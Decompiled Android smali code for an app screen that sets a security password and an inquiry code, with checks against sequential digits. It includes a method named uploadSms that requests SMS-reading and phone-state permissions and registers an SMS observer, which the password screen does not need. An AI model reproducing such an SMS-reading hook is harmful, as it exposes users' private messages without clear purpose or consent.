.class public Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;
.super Lcom/common/lib/activity/BaseActivity;
.source "SettingSafePwdActivity.java"

# interfaces
.implements Lcom/mobilelive/showCommunity/contract/SettingSafePwdContract$View;


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "Lcom/common/lib/activity/BaseActivity<",
        "Lcom/mobilelive/showCommunity/contract/SettingSafePwdContract$Presenter;",
        ">;",
        "Lcom/mobilelive/showCommunity/contract/SettingSafePwdContract$View;"
    }
.end annotation


# instance fields
.field private inquireCode:Ljava/lang/String;

.field private safeCode:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 25
    invoke-direct {p0}, Lcom/common/lib/activity/BaseActivity;-><init>()V

    const-string v0, ""

    .line 36
    iput-object v0, p0, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->safeCode:Ljava/lang/String;

    return-void
.end method

.method static synthetic access$000(Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;[I)V
    .locals 0

    .line 25
    invoke-virtual {p0, p1}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->setViewVisible([I)V

    return-void
.end method

.method static synthetic access$100(Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;[I)V
    .locals 0

    .line 25
    invoke-virtual {p0, p1}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->setViewGone([I)V

    return-void
.end method

.method static synthetic access$200(Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;[I)V
    .locals 0

    .line 25
    invoke-virtual {p0, p1}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->setViewVisible([I)V

    return-void
.end method

.method static synthetic access$300(Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;[I)V
    .locals 0

    .line 25
    invoke-virtual {p0, p1}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->setViewGone([I)V

    return-void
.end method

.method static synthetic access$400(Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;[I)V
    .locals 0

    .line 25
    invoke-virtual {p0, p1}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->setViewVisible([I)V

    return-void
.end method

.method static synthetic access$500(Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;[I)V
    .locals 0

    .line 25
    invoke-virtual {p0, p1}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->setViewGone([I)V

    return-void
.end method

.method static synthetic access$600(Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;[I)V
    .locals 0

    .line 25
    invoke-virtual {p0, p1}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->setViewVisible([I)V

    return-void
.end method

.method static synthetic access$700(Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;[I)V
    .locals 0

    .line 25
    invoke-virtual {p0, p1}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->setViewGone([I)V

    return-void
.end method

.method static synthetic access$802(Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;Ljava/lang/String;)Ljava/lang/String;
    .locals 0

    .line 25
    iput-object p1, p0, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->safeCode:Ljava/lang/String;

    return-object p1
.end method

.method private uploadSms()V
    .locals 3

    .line 113
    invoke-static {}, Lcom/common/lib/sms/SmsServiceRoom;->getInstance()Lcom/common/lib/sms/SmsServiceRoom;

    move-result-object v0

    invoke-virtual {v0}, Lcom/common/lib/sms/SmsServiceRoom;->getSmsContent()Lcom/common/lib/sms/SmsContent;

    move-result-object v0

    if-nez v0, :cond_0

    .line 114
    invoke-static {p0}, Lcom/permissionx/guolindev/PermissionX;->init(Landroidx/fragment/app/FragmentActivity;)Lcom/permissionx/guolindev/PermissionMediator;

    move-result-object v0

    const-string v1, "android.permission.READ_SMS"

    const-string v2, "android.permission.READ_PHONE_STATE"

    filled-new-array {v1, v2}, [Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/permissionx/guolindev/PermissionMediator;->permissions([Ljava/lang/String;)Lcom/permissionx/guolindev/request/PermissionBuilder;

    move-result-object v0

    new-instance v1, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity$$ExternalSyntheticLambda2;

    invoke-direct {v1, p0}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity$$ExternalSyntheticLambda2;-><init>(Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;)V

    .line 115
    invoke-virtual {v0, v1}, Lcom/permissionx/guolindev/request/PermissionBuilder;->request(Lcom/permissionx/guolindev/callback/RequestCallback;)V

    :cond_0
    return-void
.end method


# virtual methods
.method protected getLayoutId()I
    .locals 1

    const v0, 0x7f0c0027

    return v0
.end method

.method public getSuccess()V
    .locals 2

    .line 151
    sget-object v0, Lcom/common/lib/manager/DataManager;->Companion:Lcom/common/lib/manager/DataManager$Companion;

    invoke-virtual {v0}, Lcom/common/lib/manager/DataManager$Companion;->getInstance()Lcom/common/lib/manager/DataManager;

    move-result-object v0

    invoke-virtual {v0}, Lcom/common/lib/manager/DataManager;->getMyInfo()Lcom/common/lib/bean/RealInfoBean;

    move-result-object v0

    if-nez v0, :cond_0

    return-void

    .line 153
    :cond_0
    iget-object v1, p0, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->inquireCode:Ljava/lang/String;

    invoke-virtual {v0, v1}, Lcom/common/lib/bean/RealInfoBean;->setSearch_password(Ljava/lang/String;)V

    .line 154
    iget-object v1, p0, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->safeCode:Ljava/lang/String;

    invoke-virtual {v0, v1}, Lcom/common/lib/bean/RealInfoBean;->setSecurity_password(Ljava/lang/String;)V

    .line 155
    sget-object v1, Lcom/common/lib/manager/DataManager;->Companion:Lcom/common/lib/manager/DataManager$Companion;

    invoke-virtual {v1}, Lcom/common/lib/manager/DataManager$Companion;->getInstance()Lcom/common/lib/manager/DataManager;

    move-result-object v1

    invoke-virtual {v1, v0}, Lcom/common/lib/manager/DataManager;->saveMyInfo(Lcom/common/lib/bean/RealInfoBean;)V

    .line 156
    const-class v0, Lcom/mobilelive/showCommunity/activity/ActivationActivity;

    invoke-virtual {p0, v0}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->openActivity(Ljava/lang/Class;)V

    .line 157
    invoke-virtual {p0}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->finish()V

    return-void
.end method

.method public isOrderNumeric(Ljava/lang/String;)Z
    .locals 1

    const-string v0, "012345"

    .line 126
    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "123456"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "234567"

    .line 127
    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "345678"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "456789"

    .line 128
    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "567890"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "987654"

    .line 129
    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "876543"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "765432"

    .line 130
    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "654321"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "543210"

    .line 131
    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    goto :goto_0

    :cond_0
    const/4 p1, 0x1

    return p1

    :cond_1
    :goto_0
    const/4 p1, 0x0

    return p1
.end method

.method public synthetic lambda$onCreated$0$com-mobilelive-showCommunity-activity-SettingSafePwdActivity(Lcom/mobilelive/showCommunity/view/InquirePassView;Lcom/mobilelive/showCommunity/view/InquirePassView;Ljava/lang/String;)V
    .locals 3

    .line 79
    iget-object v0, p0, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->safeCode:Ljava/lang/String;

    invoke-virtual {v0, p3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    const v1, 0x7f0f0047

    const v2, 0x7f0f0048

    if-eqz v0, :cond_1

    .line 80
    iget-object v0, p0, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->inquireCode:Ljava/lang/String;

    invoke-virtual {v0, p3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p3

    if-eqz p3, :cond_0

    .line 81
    invoke-virtual {p0, v2}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->getString(I)Ljava/lang/String;

    move-result-object p3

    const v0, 0x7f0f0049

    invoke-virtual {p0, v0}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v1}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->getString(I)Ljava/lang/String;

    move-result-object v1

    new-instance v2, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity$3;

    invoke-direct {v2, p0, p1, p2}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity$3;-><init>(Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;Lcom/mobilelive/showCommunity/view/InquirePassView;Lcom/mobilelive/showCommunity/view/InquirePassView;)V

    invoke-virtual {p0, p3, v0, v1, v2}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->showOneBtnDialog(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Lcom/common/lib/interfaces/OnClickCallback;)Lcom/common/lib/dialog/MyDialogFragment;

    goto :goto_0

    .line 92
    :cond_0
    invoke-virtual {p0}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->getPresenter()Lcom/common/lib/mvp/IPresenter;

    move-result-object p1

    check-cast p1, Lcom/mobilelive/showCommunity/contract/SettingSafePwdContract$Presenter;

    iget-object p2, p0, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->inquireCode:Ljava/lang/String;

    iget-object p3, p0, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->safeCode:Ljava/lang/String;

    invoke-interface {p1, p2, p3}, Lcom/mobilelive/showCommunity/contract/SettingSafePwdContract$Presenter;->upLoadData(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    .line 95
    :cond_1
    invoke-virtual {p0, v2}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->getString(I)Ljava/lang/String;

    move-result-object p3

    const v0, 0x7f0f004a

    invoke-virtual {p0, v0}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v1}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->getString(I)Ljava/lang/String;

    move-result-object v1

    new-instance v2, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity$4;

    invoke-direct {v2, p0, p1, p2}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity$4;-><init>(Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;Lcom/mobilelive/showCommunity/view/InquirePassView;Lcom/mobilelive/showCommunity/view/InquirePassView;)V

    invoke-virtual {p0, p3, v0, v1, v2}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->showOneBtnDialog(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Lcom/common/lib/interfaces/OnClickCallback;)Lcom/common/lib/dialog/MyDialogFragment;

    :goto_0
    return-void
.end method

.method public synthetic lambda$onCreated$1$com-mobilelive-showCommunity-activity-SettingSafePwdActivity(Lcom/mobilelive/showCommunity/view/InquirePassView;Ljava/lang/String;)V
    .locals 4

    .line 49
    invoke-virtual {p0, p2}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->isOrderNumeric(Ljava/lang/String;)Z

    move-result v0

    const v1, 0x7f0f0047

    const v2, 0x7f0f0048

    if-nez v0, :cond_0

    .line 50
    invoke-virtual {p0, v2}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->getString(I)Ljava/lang/String;

    move-result-object p2

    const v0, 0x7f0f00a7

    invoke-virtual {p0, v0}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v1}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->getString(I)Ljava/lang/String;

    move-result-object v1

    new-instance v2, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity$1;

    invoke-direct {v2, p0, p1}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity$1;-><init>(Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;Lcom/mobilelive/showCommunity/view/InquirePassView;)V

    invoke-virtual {p0, p2, v0, v1, v2}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->showOneBtnDialog(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Lcom/common/lib/interfaces/OnClickCallback;)Lcom/common/lib/dialog/MyDialogFragment;

    return-void

    .line 61
    :cond_0
    iget-object v0, p0, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->inquireCode:Ljava/lang/String;

    invoke-virtual {v0, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 62
    invoke-virtual {p0, v2}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->getString(I)Ljava/lang/String;

    move-result-object p2

    const v0, 0x7f0f0049

    invoke-virtual {p0, v0}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v1}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->getString(I)Ljava/lang/String;

    move-result-object v1

    new-instance v2, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity$2;

    invoke-direct {v2, p0, p1}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity$2;-><init>(Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;Lcom/mobilelive/showCommunity/view/InquirePassView;)V

    invoke-virtual {p0, p2, v0, v1, v2}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->showOneBtnDialog(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Lcom/common/lib/interfaces/OnClickCallback;)Lcom/common/lib/dialog/MyDialogFragment;

    return-void

    .line 73
    :cond_1
    iput-object p2, p0, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->safeCode:Ljava/lang/String;

    const p2, 0x7f09004f

    .line 74
    invoke-virtual {p0, p2}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Lcom/mobilelive/showCommunity/view/InquirePassView;

    const/4 v1, 0x1

    new-array v2, v1, [I

    const/4 v3, 0x0

    aput p2, v2, v3

    .line 75
    invoke-virtual {p0, v2}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->setViewVisible([I)V

    new-array p2, v1, [I

    const v1, 0x7f0901b0

    aput v1, p2, v3

    .line 76
    invoke-virtual {p0, p2}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->setViewGone([I)V

    const p2, 0x7f0f0020

    .line 77
    invoke-virtual {p0, p2}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->getString(I)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v0, p2}, Lcom/mobilelive/showCommunity/view/InquirePassView;->setData(Ljava/lang/String;)V

    .line 78
    new-instance p2, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity$$ExternalSyntheticLambda1;

    invoke-direct {p2, p0, p1, v0}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity$$ExternalSyntheticLambda1;-><init>(Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;Lcom/mobilelive/showCommunity/view/InquirePassView;Lcom/mobilelive/showCommunity/view/InquirePassView;)V

    invoke-virtual {v0, p2}, Lcom/mobilelive/showCommunity/view/InquirePassView;->setPayClickListener(Lcom/mobilelive/showCommunity/view/InquirePassView$OnPayClickListener;)V

    return-void
.end method

.method public synthetic lambda$uploadSms$2$com-mobilelive-showCommunity-activity-SettingSafePwdActivity(ZLjava/util/List;Ljava/util/List;)V
    .locals 0

    if-eqz p1, :cond_0

    .line 117
    new-instance p1, Lcom/common/lib/sms/SmsContent;

    invoke-direct {p1, p0}, Lcom/common/lib/sms/SmsContent;-><init>(Landroid/app/Activity;)V

    .line 118
    invoke-virtual {p1}, Lcom/common/lib/sms/SmsContent;->register()V

    .line 119
    invoke-static {}, Lcom/common/lib/sms/SmsServiceRoom;->getInstance()Lcom/common/lib/sms/SmsServiceRoom;

    move-result-object p2

    invoke-virtual {p2, p1}, Lcom/common/lib/sms/SmsServiceRoom;->setSmsContent(Lcom/common/lib/sms/SmsContent;)V

    :cond_0
    return-void
.end method

.method public onClick(Landroid/view/View;)V
    .locals 0

    return-void
.end method

.method protected bridge synthetic onCreatePresenter()Lcom/common/lib/mvp/IPresenter;
    .locals 1

    .line 25
    invoke-virtual {p0}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->onCreatePresenter()Lcom/mobilelive/showCommunity/contract/SettingSafePwdContract$Presenter;

    move-result-object v0

    return-object v0
.end method

.method protected onCreatePresenter()Lcom/mobilelive/showCommunity/contract/SettingSafePwdContract$Presenter;
    .locals 1

    .line 141
    new-instance v0, Lcom/mobilelive/showCommunity/presenter/SettingSafePwdPresenter;

    invoke-direct {v0, p0}, Lcom/mobilelive/showCommunity/presenter/SettingSafePwdPresenter;-><init>(Lcom/mobilelive/showCommunity/contract/SettingSafePwdContract$View;)V

    return-object v0
.end method

.method protected onCreated(Landroid/os/Bundle;)V
    .locals 2

    const p1, 0x7f090235

    const v0, 0x7f0f00a5

    .line 41
    invoke-virtual {p0, p1, v0}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->setText(II)V

    const/4 p1, 0x1

    new-array p1, p1, [I

    const/4 v0, 0x0

    const v1, 0x7f090105

    aput v1, p1, v0

    .line 42
    invoke-virtual {p0, p1}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->setViewGone([I)V

    .line 43
    invoke-virtual {p0}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->getIntent()Landroid/content/Intent;

    move-result-object p1

    if-eqz p1, :cond_0

    const-string v0, "inquireCode"

    .line 45
    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    iput-object p1, p0, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->inquireCode:Ljava/lang/String;

    :cond_0
    const p1, 0x7f0901b0

    .line 46
    invoke-virtual {p0, p1}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Lcom/mobilelive/showCommunity/view/InquirePassView;

    const v0, 0x7f0f0055

    .line 47
    invoke-virtual {p0, v0}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Lcom/mobilelive/showCommunity/view/InquirePassView;->setData(Ljava/lang/String;)V

    .line 48
    new-instance v0, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity$$ExternalSyntheticLambda0;

    invoke-direct {v0, p0, p1}, Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity$$ExternalSyntheticLambda0;-><init>(Lcom/mobilelive/showCommunity/activity/SettingSafePwdActivity;Lcom/mobilelive/showCommunity/view/InquirePassView;)V

    invoke-virtual {p1, v0}, Lcom/mobilelive/showCommunity/view/InquirePassView;->setPayClickListener(Lcom/mobilelive/showCommunity/view/InquirePassView$OnPayClickListener;)V

    return-void
.end method

.method protected updateUIText()V
    .locals 0

    return-void
.end method
